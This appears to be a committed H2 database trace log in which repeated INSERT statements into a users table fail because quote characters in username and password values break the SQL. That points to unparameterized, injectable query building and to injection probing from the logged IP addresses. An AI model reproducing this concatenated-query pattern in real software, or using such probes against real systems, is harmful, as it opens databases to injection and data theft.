+INSERT INTO users(role, username, password, ip) VALUES('user', '''', ''', '220.133.209.6') [42000-178]
+06-16 12:14:13 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Syntax error in SQL statement "INSERT INTO users(role, username, password, ip) VALUES('user', '''', ''', '220.133.209.6[*]')"; SQL statement:
+INSERT INTO users(role, username, password, ip) VALUES('user', '''', ''', '220.133.209.6') [42000-178]
+06-16 12:14:13 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Syntax error in SQL statement "INSERT INTO users(role, username, password, ip) VALUES('user', '''', ''', '220.133.209.6[*]')"; SQL statement:
+INSERT INTO users(role, username, password, ip) VALUES('user', '''', ''', '220.133.209.6') [42000-178]
+06-16 12:14:13 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Syntax error in SQL statement "INSERT INTO users(role, username, password, ip) VALUES('user', '''', ''', '220.133.209.6[*]')"; SQL statement:
+INSERT INTO users(role, username, password, ip) VALUES('user', '''', ''', '220.133.209.6') [42000-178]
+06-16 12:14:13 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Syntax error in SQL statement "INSERT INTO users(role, username, password, ip) VALUES('user', '''', ''', '220.133.209.6[*]')"; SQL statement:
+INSERT INTO users(role, username, password, ip) VALUES('user', '''', ''', '220.133.209.6') [42000-178]
+06-16 12:18:45 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Syntax error in SQL statement "INSERT INTO users(role, username, password, ip) VALUES('user', '''', ''', '220.133.209.6[*]')"; SQL statement:
+INSERT INTO users(role, username, password, ip) VALUES('user', '''', ''', '220.133.209.6') [42000-178]
+06-16 12:18:47 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Syntax error in SQL statement "INSERT INTO users(role, username, password, ip) VALUES('user', '''', ''', '220.133.209.6[*]')"; SQL statement:
+INSERT INTO users(role, username, password, ip) VALUES('user', '''', ''', '220.133.209.6') [42000-178]
+06-16 12:18:51 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Syntax error in SQL statement "INSERT INTO users(role, username, password, ip) VALUES('user', '''', ''', '220.133.209.6[*]')"; SQL statement:
+INSERT INTO users(role, username, password, ip) VALUES('user', '''', ''', '220.133.209.6') [42000-178]
+06-16 12:18:53 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Syntax error in SQL statement "INSERT INTO users(role, username, password, ip) VALUES('user', '''', '\'', '220.133.209.6[*]')"; SQL statement:
+INSERT INTO users(role, username, password, ip) VALUES('user', '''', '\'', '220.133.209.6') [42000-178]
+06-16 14:47:01 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Syntax error in SQL statement "INSERT INTO users(role, username, password, ip) VALUES('user', 'fefeq', ''', '118.165.229.172[*]')"; SQL statement:
+INSERT INTO users(role, username, password, ip) VALUES('user', 'fefeq', ''', '118.165.229.172') [42000-178]
+06-16 14:49:05 jdbc[3]: exception
+org.h2.jdbc.JdbcSQLException: Syntax error in SQL statement "INSERT INTO users(role, username, password, ip) VALUES('user', 'dwdw', ''', '118.165.229.172[*]')"; SQL statement:
+INSERT INTO users(role, username, password, ip) VALUES('user', 'dwdw', ''', '118.165.229.172') [42000-178]
